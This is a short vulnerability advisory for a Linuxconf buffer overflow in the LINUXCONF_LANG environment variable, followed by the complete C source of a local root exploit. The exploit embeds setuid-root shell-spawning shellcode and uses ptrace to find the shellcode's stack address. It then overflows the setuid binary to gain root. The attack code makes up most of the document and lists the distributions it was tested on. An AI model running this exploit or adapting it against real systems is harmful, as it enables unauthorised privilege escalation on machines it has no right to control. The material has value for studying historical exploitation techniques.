source: http://www.securityfocus.com/bid/5585/info

Linuxconf is a Linux configuration utility from Solucorp. It is typically installed as a setuid root utility for the management and configuration of Linux operating systems.

A buffer overflow vulnerability has been reported for Linuxconf. The vulnerability is due to insufficent bounds checking of the LINUXCONF_LANG environment variable. An attacker who sets the LINUXCONF_LANG environment variable with an overly large string will be able to cause the buffer overflow condition. 

/* 
 * Linuxconf <= 1.28r3 local xploit
 * by RaiSe <raise@netsearch-ezine.com>
 * http://www.netsearch-ezine.com
 *
 * Tested on:
 *             Mandrake 8.0
 *             Mandrake 8.2
 *             RedHat   7.3
 *
 * (run without args on directory
 *  with +w)
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <asm/user.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#define PATHLCONF	"/sbin/linuxconf"


unsigned long get_shell(void);

char shellcode[]=  // by RaiSe
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc9\x51\xb8\x38"
"\x65\x73\x68\x66\x35\x56\x4a\x50\xb8\x65\x65\x62\x69\x66\x35"
"\x4a\x4a\x50\x89\xe3\x51\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b"
"\xcd\x80";


int main(void)
{
FILE *fp;
char buf[2056], buf2[2048];
unsigned long shell, *p;
int i;


printf("\n[ Linuxconf Local Xploit by RaiSe ]\n\n");
fflush(stdout);

sprintf(buf2, "%s.eng", shellcode);

if (mkdir(buf2, S_IRWXU))
	{
	fprintf(stderr, "* Error at creat directory (.eng), +w? is it exist?, "
	                "delete it and run again.\n\n");
	exit(-1);
	}
else	
	sprintf(buf2, "%s.eng/%s.eng", shellcode, shellcode);

if ((fp = fopen(buf2, "w")) == NULL)
	{
    fprintf(stderr, "* Error at creat file,  +w?\n\n");
    exit(-1);
	}
else
	fclose(fp);

printf("* Directory + file created ..\n");
printf("   [dont forget to delete it ;)]\n");
fflush(stdout);

bzero(buf, sizeof(buf));
shell = get_shell();

p = (unsigned long *) buf;

for (i = 0; i < 2048 ; i+=4)
	*p++ = shell;


setenv("SCODE", shellcode, 1);
setenv("LINUXCONF_LANG",buf,1);
execl(PATHLCONF, "linuxconf", NULL);

exit(-1);

} /******* end of main() ******/


unsigned long get_shell(void)
{
unsigned long sc;
struct user_regs_struct regs;
int pid_vuln, n;


/* creamos un proceso */
if (!(pid_vuln = fork()))
	{
	char buf[2056];

	sleep(2);
	bzero(buf, sizeof(buf));
	memset(buf, 0x41, 2048);

	setenv("SCODE", shellcode, 1);
	setenv("LINUXCONF_LANG",buf, 1);
	execl(PATHLCONF, "linuxconf", NULL);

	fprintf(stderr, "Error: execl.\n");
	exit(-1);
	}
else
	{

	if (ptrace(PTRACE_ATTACH, pid_vuln))
		{
		fprintf(stderr, "Error: PTRACE_ATTACH.\n");
		exit(-1);
		}

	waitpid(pid_vuln, NULL, 0);

    printf("\n[* Looking at %%esp .. ]\n");
	fflush(stdout);

    if (ptrace(PTRACE_CONT, pid_vuln, 0, 0))
        {
        fprintf(stderr, "Error: PTRACE_CONT.\n");
        exit(-1);
        }

    waitpid(pid_vuln, NULL, 0);

    if (ptrace(PTRACE_GETREGS, pid_vuln, 0, &regs))
        {
        fprintf(stderr, "Error: PTRACE_GETREGS.\n");
        exit(-1);
        }

	printf("[* Looking at: 0x%08x ]\n", (int) regs.esp);
    fflush(stdout);

	n = 0, sc = 0;

	do 
		{
	    if ((sc = ptrace(PTRACE_PEEKTEXT, pid_vuln,
			 (int)(regs.esp+(n++)), 0)) == -1)
	        {
	        fprintf(stderr, "Error: PTRACE_PEEKTEXT.\n");
	        exit(-1);
    	    }

		} while (sc != 0x90909090);
	
	n--;
	printf("[* Shellcode found at: 0x%08x ]\n", (int)(regs.esp + n));
	fflush(stdout);

	if(ptrace(PTRACE_KILL, pid_vuln, 0, 0))
		{
		fprintf(stderr, "Error: PTRACE_KILL.\n");
		exit(-1);
		}
	else
		{
		waitpid(pid_vuln, NULL, 0);
		printf("[* Xploting .. ]\n\n");
		fflush(stdout);
		sleep(1);
		return((unsigned long)(regs.esp + n));
		}
	}

} /********* enf of get_shell() **********/


/* EOF */